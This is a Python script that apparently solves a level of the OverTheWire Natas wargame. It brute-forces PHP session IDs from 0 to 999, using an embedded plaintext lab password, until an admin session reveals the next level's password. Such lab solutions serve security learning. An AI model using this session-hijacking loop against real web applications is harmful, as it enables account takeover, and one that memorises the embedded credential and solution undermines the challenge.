import requests
import re
from requests.auth import HTTPBasicAuth

try:
	print("\nStart...\n")
	for num in range(0, 1000):
		resp = requests.get("http://natas18.natas.labs.overthewire.org/index.php", timeout=60, auth=HTTPBasicAuth("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"), cookies={"PHPSESSID": "{}".format(num), "admin": "1"})
		if "Password: " in resp.text:
			print(re.search(r'Password: [a-zA-Z0-9]{0,32}', resp.text)[0])
			break
	print("\nFinish...\n")
except:
	pass
